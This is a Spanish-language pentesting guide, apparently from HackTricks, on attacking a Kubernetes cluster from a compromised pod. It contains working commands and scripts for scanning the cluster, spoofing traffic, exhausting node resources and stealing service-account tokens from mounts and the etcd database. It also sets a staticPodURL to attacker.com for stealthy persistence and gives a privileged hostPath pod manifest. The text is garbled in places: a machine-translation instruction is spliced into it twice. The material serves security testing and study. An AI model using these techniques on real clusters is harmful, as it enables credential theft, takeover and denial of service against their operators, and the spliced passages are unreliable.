# Atacando Kubernetes desde dentro de un Pod

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## **Fuga de Pod**

**Si tienes la suerte suficiente, podr칤as lograr escapar de 칠l hacia el nodo:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando del pod

Para intentar escapar del pod, es posible que primero necesites **escalar privilegios**, algunas t칠cnicas para hacerlo:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Puedes revisar estos **escape de docker para intentar escapar** de un pod que hayas comprometido:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusando de los Privilegios de Kubernetes

Como se explica en la secci칩n sobre **enumeraci칩n de kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Por lo general, los pods se ejecutan con un **token de cuenta de servicio** en su interior. Esta cuenta de servicio puede tener algunos **privilegios adjuntos** que podr칤as **abusar** para **moverte** a otros pods o incluso para **escapar** a los nodos configurados dentro del cl칰ster. Aprende c칩mo hacerlo en:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusando de los Privilegios en la Nube

Si el pod se ejecuta dentro de un **entorno en la nube**, es posible que puedas **filtrar un token desde el punto de conexi칩n de metadatos** y escalar privilegios us치ndolo.

## Buscar servicios de red vulnerables

Dado que est치s dentro del entorno de Kubernetes, si no puedes escalar privilegios abusando de los privilegios actuales de los pods y no puedes escapar del contenedor, deber칤as **buscar servicios potencialmente vulnerables.**

### Servicios

**Con este prop칩sito, puedes intentar obtener todos los servicios del entorno de kubernetes:**
```
kubectl get svc --all-namespaces
```
Por defecto, Kubernetes utiliza un esquema de red plano, lo que significa que **cualquier pod/servicio dentro del cl칰ster puede comunicarse con otros**. Los **espacios de nombres** dentro del cl칰ster **no tienen restricciones de seguridad de red por defecto**. Cualquiera en el espacio de nombres puede comunicarse con otros espacios de nombres.

### Escaneo

El siguiente script Bash (tomado de un [taller de Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) instalar치 y escanear치 los rangos de IP del cl칰ster de Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Echa un vistazo a la siguiente p치gina para aprender c칩mo podr칤as **atacar servicios espec칤ficos de Kubernetes** para **comprometer otros pods/todo el entorno**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

En caso de que el **pod comprometido est칠 ejecutando alg칰n servicio sensible** donde otros pods necesiten autenticarse, podr칤as obtener las credenciales enviadas desde los otros pods **espiando las comunicaciones locales**.

## Suplantaci칩n de red

Por defecto, t칠cnicas como el **ARP spoofing** (y gracias a eso, el **DNS Spoofing**) funcionan en la red de Kubernetes. Entonces, dentro de un pod, si tienes la **capacidad NET\_RAW** (que est치 ah칤 por defecto), podr치s enviar paquetes de red personalizados y realizar **ataques de MitM a trav칠s de ARP Spoofing a todos los pods que se ejecutan en el mismo nodo**.\
Adem치s, si el **pod malicioso** se est치 ejecutando en el **mismo nodo que el Servidor DNS**, podr치s realizar un **ataque de DNS Spoofing a todos los pods en el cl칰ster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS en el nodo

No hay especificaci칩n de recursos en los manifiestos de Kubernetes y **no se aplican l칤mites** para los contenedores. Como atacante, podemos **consumir todos los recursos donde se est칠 ejecutando el pod/despliegue** y privar de recursos a otros y causar un DoS en el entorno.

Esto se puede hacer con una herramienta como [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Puedes ver la diferencia mientras se ejecuta `stress-ng` y despu칠s
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-Explotaci칩n del Nodo

Si lograste **escapar del contenedor**, encontrar치s cosas interesantes en el nodo:

- El proceso de **Ejecuci칩n de Contenedores** (Docker)
- M치s **pods/contenedores** ejecut치ndose en el nodo que puedes aprovechar (m치s tokens)
- Todo el **sistema de archivos** y el **SO** en general
- El servicio **Kube-Proxy** escuchando
- El servicio **Kubelet** escuchando. Verifica los archivos de configuraci칩n:
  - Directorio: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Otros **archivos comunes de Kubernetes**:
  - `$HOME/.kube/config` - **Configuraci칩n de Usuario**
  - `/etc/kubernetes/kubelet.conf`- **Configuraci칩n Regular**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Configuraci칩n de Inicio**
  - `/etc/kubernetes/manifests/etcd.yaml` - **Configuraci칩n de etcd**
  - `/etc/kubernetes/pki` - **Clave de Kubernetes**

### Encontrar kubeconfig del nodo

Si no puedes encontrar el archivo kubeconfig en alguna de las rutas mencionadas anteriormente, **verifica el argumento `--kubeconfig` del proceso kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Robo de Secretos
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
El script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) **obtendr치 autom치ticamente los tokens de otros pods y verificar치 si tienen los permisos** que est치s buscando (en lugar de que los busques uno por uno):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### DaemonSets Privilegiados

Un DaemonSet es un **pod** que se **ejecutar치** en **todos los nodos del cl칰ster**. Por lo tanto, si un DaemonSet est치 configurado con una **cuenta de servicio privilegiada**, en **TODOS los nodos** podr치s encontrar el **token** de esa **cuenta de servicio privilegiada** que podr칤as abusar.

La explotaci칩n es la misma que en la secci칩n anterior, pero ahora no dependes de la suerte.

### Pivotar hacia la Nube

Si el cl칰ster est치 gestionado por un servicio en la nube, generalmente el **Nodo tendr치 un acceso diferente al endpoint de metadatos** que el Pod. Por lo tanto, intenta **acceder al endpoint de metadatos desde el nodo** (o desde un pod con hostNetwork a True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Robar etcd

Si puedes especificar el [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) del Nodo que ejecutar치 el contenedor, obt칠n una shell dentro de un nodo de plano de control y obt칠n la **base de datos etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Los nodos de plano de control tienen el **rol de maestro** y en **cl칰steres administrados en la nube no podr치s ejecutar nada en ellos**.

#### Leer secretos desde etcd

Si puedes ejecutar tu pod en un nodo de plano de control utilizando el selector `nodeName` en la especificaci칩n del pod, podr칤as tener acceso f치cil a la base de datos `etcd`, que contiene toda la configuraci칩n del cl칰ster, incluidos todos los secretos.

A continuaci칩n se muestra una forma r치pida y sucia de obtener secretos de `etcd` si se est치 ejecutando en el nodo de plano de control en el que te encuentras. Si deseas una soluci칩n m치s elegante que inicie un pod con la utilidad de cliente `etcd` `etcdctl` y utilice las credenciales del nodo de plano de control para conectarse a `etcd` donde sea que se est칠 ejecutando, consulta [este ejemplo de manifiesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Verifica si `etcd` se est치 ejecutando en el nodo de plano de control y d칩nde se encuentra la base de datos (esto es en un cl칰ster creado con `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
El siguiente contenido es de un libro de hacking sobre t칠cnicas de hacking. El contenido siguiente es del archivo pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod.md. Traduce el texto relevante al espa침ol y devuelve la traducci칩n manteniendo exactamente la misma sintaxis de markdown y html. No traduzcas cosas como c칩digo, nombres de t칠cnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregues nada adicional aparte de la traducci칩n y la sintaxis de markdown.
```bash
data-dir=/var/lib/etcd
```
**Ver los datos en la base de datos de etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extraer los tokens de la base de datos y mostrar el nombre de la cuenta de servicio**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Mismo comando, pero con algunos greps para devolver solo el token predeterminado en el espacio de nombres kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
El siguiente contenido es de un libro de hacking sobre t칠cnicas de hacking. El contenido siguiente es del archivo pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod.md. Traduce el texto relevante al espa침ol y devuelve la traducci칩n manteniendo exactamente la misma sintaxis de markdown y html. No traduzcas cosas como c칩digo, nombres de t칠cnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregues nada aparte de la traducci칩n y la sintaxis de markdown.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Persistencia de Pods Est치ticos/Reflejados

_Los Pods Est치ticos_ son gestionados directamente por el demonio kubelet en un nodo espec칤fico, sin que el servidor API los observe. A diferencia de los Pods gestionados por el plano de control (por ejemplo, un Despliegue); en su lugar, **el kubelet observa cada Pod est치tico** (y lo reinicia si falla).

Por lo tanto, los Pods est치ticos siempre est치n **vinculados a un solo Kubelet** en un nodo espec칤fico.

El **kubelet intenta autom치ticamente crear un Pod espejo en el servidor API de Kubernetes** para cada Pod est치tico. Esto significa que los Pods en ejecuci칩n en un nodo son visibles en el servidor API, pero no se pueden controlar desde all칤. Los nombres de los Pods tendr치n un sufijo con el nombre del nodo con un guion delante.

{% hint style="danger" %}
La **`spec` de un Pod est치tico no puede hacer referencia a otros objetos de la API** (por ejemplo, ServiceAccount, ConfigMap, Secret, etc. Por lo tanto, **no puedes abusar de este comportamiento para lanzar un pod con una ServiceAccount arbitraria** en el nodo actual para comprometer el cl칰ster. Pero podr칤as usar esto para ejecutar pods en diferentes espacios de nombres (en caso de que sea 칰til por alguna raz칩n).
{% endhint %}

Si est치s dentro del host del nodo, puedes hacer que cree un **pod est치tico dentro de s칤 mismo**. Esto es bastante 칰til porque podr칤a permitirte **crear un pod en un espacio de nombres diferente** como **kube-system**.

Para crear un pod est치tico, la [**documentaci칩n es de gran ayuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). B치sicamente necesitas 2 cosas:

* Configurar el par치metro **`--pod-manifest-path=/etc/kubernetes/manifests`** en el **servicio kubelet**, o en la **configuraci칩n kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) y reiniciar el servicio
* Crear la definici칩n en el **archivo de definici칩n del pod** en **`/etc/kubernetes/manifests`**

**Otra forma m치s sigilosa ser칤a:**

* Modificar el par치metro **`staticPodURL`** del archivo de configuraci칩n de **kubelet** y establecer algo como `staticPodURL: http://attacker.com:8765/pod.yaml`. Esto har치 que el proceso kubelet cree un **pod est치tico** obteniendo la **configuraci칩n desde la URL indicada**.

**Ejemplo** de **configuraci칩n de pod** para crear un pod con privilegios en **kube-system** tomado de [**aqu칤**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Eliminar pods + nodos no programables

Si un atacante ha **comprometido un nodo** y puede **eliminar pods** de otros nodos y **hacer que otros nodos no puedan ejecutar pods**, los pods se volver치n a ejecutar en el nodo comprometido y podr치 **robar los tokens** que se ejecutan en ellos.\
Para [**m치s informaci칩n sigue estos enlaces**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Herramientas Autom치ticas

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme en** Twitter 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
